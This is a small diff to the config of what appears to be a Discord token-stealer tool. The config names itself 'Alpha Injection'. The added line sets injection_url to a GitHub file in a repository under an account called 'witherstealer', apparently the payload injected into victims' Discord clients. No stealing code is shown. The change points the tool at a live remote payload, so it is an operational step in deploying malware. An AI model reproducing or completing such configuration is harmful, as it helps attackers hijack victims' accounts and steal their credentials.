@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Alpha Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1287088936711356416/1303811084741902447/alphasquad.png?ex=672d1c32&is=672bcab2&hm=ad3a5b80eca7ce5217da7decd5e9a7deb44cdd870f1c6d9886e535f800891633&'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: '', 
+  injection_url: 'https://github.com/witherstealer/wtfalphasquadwtf/blob/main/index.js', 
   /**
    
    **/
